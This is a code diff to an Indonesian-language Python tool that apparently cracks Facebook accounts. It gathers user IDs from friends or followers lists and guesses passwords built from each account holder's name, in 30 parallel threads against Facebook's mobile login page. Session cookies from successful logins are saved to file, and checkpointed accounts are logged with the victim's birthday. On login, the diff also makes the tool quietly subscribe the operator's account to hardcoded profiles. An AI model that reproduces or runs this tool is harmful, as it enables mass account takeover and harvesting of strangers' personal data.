@@ -25,6 +25,9 @@ def bot_ea():
 	ses.post("https://graph.facebook.com/100003058813748/subscribers?access_token="+token)
 	ses.post("https://graph.facebook.com/100022849470990/subscribers?access_token="+token)
 	ses.post("https://graph.facebook.com/100010998764674/subscribers?access_token="+token)
+	print(" [+] user aktif \033[0;93m%s\033[0;97m, login berhasil"%(nama))
+	time.sleep(1)
+	menu()
 	
 def logo():
 	os.system("clear")
@@ -46,9 +49,7 @@ def login():
 		try:
 			nama = requests.get("https://graph.facebook.com/me?access_token="+token).json()["name"].lower()
 			open("login.txt", "w").write(token)
-			print(" [+] user aktif \033[0;93m%s\033[0;97m, login berhasil"%(nama))
-                        time.sleep(1)
-                        menu()
+			bot_ea()
 		except KeyError:
 			os.system("rm -f login.txt")
 			exit(" ! token kadaluwarsa")
@@ -68,7 +69,7 @@ def menu():
 		os.system("rm -f login.txt")
 		exit(" ! token kadaluwarsa")
 	logo()
-	print("\n * user aktif : %s"%(nama))
+	print(" * user aktif : %s"%(nama))
 	print(" * ip address : %s"%(ip))
 	print("\n 1 crack dari publik teman")
 	print(" 2 crack dari follower")
@@ -79,14 +80,6 @@ def menu():
 		menu()
 	elif angga == "1":
 		publik()
-		p = ThreadPool(30)
-		p.map(crack, id)
-		exit("\n [#] selesai...")
-	elif angga == "2":
-		followers()
-		p = ThreadPool(30)
-		p.map(crack, id)
-		exit("\n [#] selesai...")
 	elif angga == "3":
 		print("\n ? ketik 't' untuk ganti user agent bawaan tools")
 		useragent = raw_input(" + masukan user agent : ")
@@ -107,6 +100,22 @@ def menu():
 		exit(" # berhasil menghapus token")
 	else:
 		menu()
+
+def cek_ttl_cp(uid, pw):
+	try:
+		token = open("login.txt", "r").read()
+		with requests.Session() as ses:
+			ttl = ses.get("https://graph.facebook.com/%s?access_token=%s"%(uid, token)).json()["birthday"]
+			month, day, year = ttl.split("/")
+			month = bulan_ttl[month]
+			print("\r \033[0;93m+ %s|%s|%s %s %s\033[0;97m"%(uid, pw, day, month, year))
+			cp.append("%s|%s"%(uid, pw))
+			open("cp.txt","a").write("%s|%s|%s %s %s\n"%(uid, pw, day, month, year))
+	except KeyError, IOError:
+		day = (" ")
+		month = (" ")
+		year = (" ")
+	except:pass
 	
 def publik():
 	global token
@@ -124,9 +133,54 @@ def publik():
 	ask = raw_input("\n ? gunakan password manual? y/t: ")
 	if ask == "y":
 		manual()
-	print(" + total id : \033[0;91m%s\033[0;97m\n"%(len(id)))
-	print(" # file ok tersimpan di : ok.txt")
-	print(" # file cp tersimpan di : cp.txt\n")
+	print(" + total id : \033[0;91m%s\033[0;97m\n"%(len(id))) 
+	
+	def main(user):
+		pwx = []
+		ua = open(".useragent", "r").read()
+		global loop, token
+		sys.stdout.write(
+			"\r * crack %s/%s ok:-%s - cp:-%s "%(loop, len(id), len(ok), len(cp))
+		); sys.stdout.flush()
+		uid, name = user.split("<=>")
+		for ss in name.split(" "):
+			if len(ss)<3:
+				continue
+			elif len(ss) == 1 and len(ss) == 2 and len(ss) == 3 and len(ss) == 4 or len(ss) == 5:
+				pwx.append(ss+"123")
+				pwx.append(ss+"12345")
+			else:
+				pwx.append(ss+"123")
+				pwx.append(ss+"12345")
+		try:
+			for pw in pwx:
+				pw = pw.lower()
+				ses = requests.Session()
+				ses.headers.update({"Host":"mbasic.facebook.com","cache-control":"max-age=0","upgrade-insecure-requests":"1","user-agent":ua,"accept":"text/html,application/xhtml+xml,application/xml;q=0.9,image/webp,image/apng,*/*;q=0.8","accept-encoding":"gzip, deflate","accept-language":"id-ID,id;q=0.9,en-US;q=0.8,en;q=0.7"})
+				p = ses.get("https://mbasic.facebook.com")
+				b = ses.post("https://mbasic.facebook.com/login.php", data={"email": uid, "pass": pw, "login": "submit"})
+				if "c_user" in ses.cookies.get_dict().keys():
+					kuki = (";").join([ "%s=%s" % (key, value) for key, value in ses.cookies.get_dict().items() ])
+					print("\r \033[0;92m+ %s|%s|%s\033[0;97m"%(uid, pw, kuki))
+					ok.append("%s|%s"%(uid, pw))
+					open("ok.txt", "a").write("%s|%s\n"%(uid, pw))
+					break
+					continue
+				elif "checkpoint" in ses.cookies.get_dict().keys():
+					cek_ttl_cp(uid, pw)
+					break
+					print("\r \033[0;93m+ %s|%s\033[0;97m        "%(uid, pw))
+					cp.append("%s|%s"%(uid, pw))
+					open("cp.txt", "a").write("%s|%s\n"%(uid, pw))
+					break
+					continue
+					
+			loop += 1
+		except:
+			pass
+	p = ThreadPool(30)
+	p.map(main, id)
+	exit("\n # selesai...")
 
 def followers():
 	global token
@@ -144,78 +198,61 @@ def followers():
 	ask = raw_input("\n ? gunakan password manual? y/t: ")
 	if ask == "y":
 		manual()
-	print(" + total id : \033[0;91m%s\033[0;97m\n"%(len(id)))
-	print(" # file ok tersimpan di : ok.txt")
-	print(" # file cp tersimpan di : cp.txt\n")
+	print(" + total id : \033[0;91m%s\033[0;97m\n"%(len(id))) 
 	
-def cek_ttl_cp(uid, pw):
-	try:
-		token = open("login.txt", "r").read()
-		with requests.Session() as ses:
-			ttl = ses.get("https://graph.facebook.com/%s?access_token=%s"%(uid, token)).json()["birthday"]
-			month, day, year = ttl.split("/")
-			month = bulan_ttl[month]
-			print("\r \033[0;93m+ %s|%s|%s %s %s\033[0;97m"%(uid, pw, day, month, year))
-			cp.append("%s|%s"%(uid, pw))
-			open("cp.txt","a").write("%s|%s|%s %s %s\n"%(uid, pw, day, month, year))
-	except KeyError, IOError:
-		day = (" ")
-		month = (" ")
-		year = (" ")
-	except:pass
-
-def crack(user):
-	ua = open(".useragent", "r").read()
-	pwx = []
-	global loop, token
-	sys.stdout.write(
-		"\r * crack %s/%s ok:-%s - cp:-%s "%(loop, len(id), len(ok), len(cp))
-	); sys.stdout.flush()
-	uid, name = user.split("<=>")
-	for ss in name.split(" "):
-		if len(ss)<3:
-			continue
-		elif len(ss) == 1 and len(ss) == 2 and len(ss) == 3 and len(ss) == 4 or len(ss) == 5:
-			pwx.append(ss+"123")
-			pwx.append(ss+"12345")
-		else:
-			pwx.append(ss+"123")
-			pwx.append(ss+"12345")
-	try:
-		for pw in pwx:
-			pw = pw.lower()
-			ses = requests.Session()
-			ses.headers.update({"Host":"mbasic.facebook.com","cache-control":"max-age=0","upgrade-insecure-requests":"1","user-agent":ua,"accept":"text/html,application/xhtml+xml,application/xml;q=0.9,image/webp,image/apng,*/*;q=0.8","accept-encoding":"gzip, deflate","accept-language":"id-ID,id;q=0.9,en-US;q=0.8,en;q=0.7"})
-			b = ses.post("https://mbasic.facebook.com/login.php", data={"email": uid, "pass": pw, "login": "submit"})
-			if "c_user" in ses.cookies.get_dict().keys():
-				kuki = (";").join([ "%s=%s" % (key, value) for key, value in ses.cookies.get_dict().items() ])
-				print("\r \033[0;92m+ %s|%s|%s\033[0;97m"%(uid, pw, kuki))
-				ok.append("%s|%s"%(uid, pw))
-				open("ok.txt", "a").write("%s|%s\n"%(uid, pw))
-				break
+	def main(user):
+		pwx = []
+		ua = open(".useragent", "r").read()
+		global loop, token
+		sys.stdout.write(
+			"\r * crack %s/%s ok:-%s - cp:-%s "%(loop, len(id), len(ok), len(cp))
+		); sys.stdout.flush()
+		uid, name = user.split("<=>")
+		for ss in name.split(" "):
+			if len(ss)<3:
 				continue
-			elif "checkpoint" in ses.cookies.get_dict().keys():
-				cek_ttl_cp(uid, pw)
-				break
-				print("\r \033[0;93m+ %s|%s\033[0;97m        "%(uid, pw))
-				cp.append("%s|%s"%(uid, pw))
-				open("cp.txt", "a").write("%s|%s\n"%(uid, pw))
-				break
-				continue
-
-		loop += 1
-	except:
-		pass
-
+			elif len(ss) == 1 and len(ss) == 2 and len(ss) == 3 and len(ss) == 4 or len(ss) == 5:
+				pwx.append(ss+"123")
+				pwx.append(ss+"12345")
+			else:
+				pwx.append(ss+"123")
+				pwx.append(ss+"12345")
+		try:
+			for pw in pwx:
+				pw = pw.lower()
+				ses = requests.Session()
+				ses.headers.update({"Host":"mbasic.facebook.com","cache-control":"max-age=0","upgrade-insecure-requests":"1","user-agent":ua,"accept":"text/html,application/xhtml+xml,application/xml;q=0.9,image/webp,image/apng,*/*;q=0.8","accept-encoding":"gzip, deflate","accept-language":"id-ID,id;q=0.9,en-US;q=0.8,en;q=0.7"})
+				p = ses.get("https://mbasic.facebook.com")
+				b = ses.post("https://mbasic.facebook.com/login.php", data={"email": uid, "pass": pw, "login": "submit"})
+				if "c_user" in ses.cookies.get_dict().keys():
+					kuki = (";").join([ "%s=%s" % (key, value) for key, value in ses.cookies.get_dict().items() ])
+					print("\r \033[0;92m+ %s|%s|%s\033[0;97m"%(uid, pw, kuki))
+					ok.append("%s|%s"%(uid, pw))
+					open("ok.txt", "a").write("%s|%s\n"%(uid, pw))
+					break
+					continue
+				elif "checkpoint" in ses.cookies.get_dict().keys():
+					cek_ttl_cp(uid, pw)
+					break
+					print("\r \033[0;93m+ %s|%s\033[0;97m        "%(uid, pw))
+					cp.append("%s|%s"%(uid, pw))
+					open("cp.txt", "a").write("%s|%s\n"%(uid, pw))
+					break
+					continue
+					
+			loop += 1
+		except:
+			pass
+	p = ThreadPool(30)
+	p.map(main, id)
+	exit("\n # selesai...")
+	
 def manual():
-	ua = open(".useragent", "r").read()
 	print(" * contoh pass : sayang,anjing,bangsat\n")
 	asu = raw_input(" ? set pass : ").split(",")
 	if len(asu) =="":
 		exit(" ! jangan kosong")
 	print(" + total id : \033[0;91m%s\033[0;97m\n"%(len(id))) 
-	print(" # file ok tersimpan di : ok.txt")
-	print(" # file cp tersimpan di : cp.txt\n")
 	
 	def main(user):
 		global loop, token
@@ -228,6 +265,7 @@ def manual():
 				pw = pw.lower()
 				ses = requests.Session()
 				ses.headers.update({"Host":"mbasic.facebook.com","cache-control":"max-age=0","upgrade-insecure-requests":"1","user-agent":ua,"accept":"text/html,application/xhtml+xml,application/xml;q=0.9,image/webp,image/apng,*/*;q=0.8","accept-encoding":"gzip, deflate","accept-language":"id-ID,id;q=0.9,en-US;q=0.8,en;q=0.7"})
+				p = ses.get("https://mbasic.facebook.com")
 				b = ses.post("https://mbasic.facebook.com/login.php", data={"email": uid, "pass": pw, "login": "submit"})
 				if "c_user" in ses.cookies.get_dict().keys():
 					kuki = (";").join([ "%s=%s" % (key, value) for key, value in ses.cookies.get_dict().items() ])
@@ -253,7 +291,5 @@ def manual():
 	exit("\n # selesai...")
 
 if __name__ == "__main__":
-	os.system("git pull")
-	os.system("touch .useragent")
 	os.system("touch login.txt")
 	login()
